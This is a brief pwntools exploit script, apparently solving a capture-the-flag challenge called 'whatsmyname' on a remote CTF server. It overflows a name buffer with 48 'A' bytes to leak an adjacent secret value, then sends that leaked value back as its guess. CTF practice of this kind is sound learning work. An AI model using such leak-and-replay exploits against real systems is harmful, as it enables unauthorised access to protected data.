from pwn import *

p = process('./whatsmyname')
p = remote('challs.actf.co', 31223)

p.recv()
p.send(b'A'*48)
p.recvuntil(b'Nice to meet you, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA')
ans = p.recvuntil(b'!\nGuess')[:-7]
print(len(ans))
p.sendline(ans)
print(p.recv())
print(p.recv())
print(p.recv())
print(p.recv())
